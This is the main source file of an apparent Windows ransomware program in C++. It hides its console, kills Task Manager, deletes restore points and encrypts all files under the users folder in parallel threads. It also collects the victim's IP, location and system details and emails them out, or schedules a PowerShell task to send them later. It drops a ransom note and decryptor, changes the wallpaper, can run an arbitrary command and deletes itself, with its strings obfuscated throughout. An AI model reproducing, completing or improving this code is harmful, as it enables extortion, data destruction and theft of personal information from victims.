#include "headers.h"

using namespace std;

string WallpaperContent = "./wallpaper.jpg";
string FileIconContent = "./ICON.ico";
string EmailSenderContent = "./emailSender.ps1";
string InfoDecryptorContent = "../x64/Release/DataDecryptor.exe";

int main(int argc, char* argv[])
{   
    CreateMutexA(0, FALSE, skCrypt("Local\\$+SGSUMb/Vuib4zPiMXI6iQ==$"));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        exit(0);

    if (!DEBUG)
        ShowWindow(GetConsoleWindow(), SW_HIDE);

    if (TROJAN)
        HANDLE hThreadTrojan = CreateThread(NULL, 0, trojanFunction, NULL, HIGH_PRIORITY_CLASS, new DWORD);

    if (TSK_REMOVER)
        HANDLE hThreadTaskMng = CreateThread(NULL, 0, removeTasks, NULL, HIGH_PRIORITY_CLASS, new DWORD);
    
    if (DELETE_RESTOREPOINT)
        deleteRestorePoints();

    string key = generateRandom(32);

    string dir;
    if (!DEBUG)
        dir = (string)skCrypt("C:\\Users\\");
    else {
        if (argc > 1)
            dir = argv[1];
        else if (fileExists(DEBUG_FOLDER))
            dir = DEBUG_FOLDER;
        else
            dir = (string)skCrypt(".\\");
    }

    vector<string> files = getFiles(dir);

    ofstream checkFile(CHECKSUM_FILE);
    checkFile << CHECK_CONTENT;
    checkFile.close();
    files.push_back(CHECKSUM_FILE);

    vector<vector<string>> filesSplitted = vectorSplitter(files, MAX_THREADS);
    
    if (CHANGE_FILE_ICON) {
        dropFile(FileIconContent, FILESICON);
        changeIcon();
    }


    thread threads[MAX_THREADS];
    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i] = thread(encryptFiles, filesSplitted[i], key);
    key = aes_encrypt(KEYOFKEY, key, IV);   // it's here for more safety
    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i].join();


    string infoFileContent = "";
    infoFileContent += (string)skCrypt("Key: ") + key + (string)skCrypt("\n");
    if (STEAL_INFO) { //User infos = semi-stealer
        infoFileContent += (string)skCrypt("Date: ") + getDate() + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("HWID: ") + getHWID() + (string)skCrypt("\n");
        vector<string> ipData = split(getIPData(), '\n');
        infoFileContent += (string)skCrypt("IP: ") + ipData[0] + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Country: ") + ipData[1] + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("City: ") + ipData[2] + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Latitude: ") + ipData[3] + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Longitude: ") + ipData[3] + (string)skCrypt("\n");
        vector<string> systemData = split(getCPU(), '\n');
        infoFileContent += (string)skCrypt("CPU name: ") + systemData[0] + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("CPU threads: ") + systemData[1] + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Ram memory: ") + systemData[2] + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("GPU name: ") + getGPU() + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Host name: ") + getPcName() + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Username: ") + getUserName() + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Screen resolution: ") + getResolution() + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Windows version: ") + getWinVersion() + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Language: ") + getLanguage() + (string)skCrypt("\n");
        infoFileContent += (string)skCrypt("Crypted files:\n");
        for (string file : files)
            infoFileContent += file + (string)skCrypt("\n");
    }
    infoFileContent = aes_encrypt(KEY, infoFileContent, IV);


    if (DROP_README)
        dropFile(InfoDecryptorContent, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\Decryptor.exe"));

    if (DROP_DECRYPTOR)
        dropFile(READMECONTENT, (string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt"));
    
    if (CHANGE_WALLPAPER)
        changeWallpaper(WallpaperContent);


    if (DEBUG ? DEBUG_SEND_EMAIL : SEND_EMAIL) {
        ofstream infoFile(INFOFILE);
        infoFile << infoFileContent;
        infoFile.close();
        if (DEBUG) {
            ofstream infoFileBackup(split(INFOFILE, '\\').back());
            infoFileBackup << infoFileContent;
            infoFileBackup.close();
        }
        if (isConnected2Internet()) {
            sendEmail();
            DeleteFileA((INFOFILE).c_str());
        }
        else {
            dropFile(EmailSenderContent, EMAILSENDER);
            scheduleTask();
        }
    }
    
    if (SEND_CUSTOM_COMMAND)
        system((CUSTOM_COMMAND).c_str());


    /*debug output*/
    if (DEBUG) {
        cout << skCrypt("\nEncoded ") << aes_decrypt(KEY, infoFileContent, IV) << skCrypt("\n");
        Sleep(5000);
        system("pause");
    }

    if (!DEBUG && argc > 0 && SELFKILL)
        deleteMe((string)argv[0]);

    return 0;
}
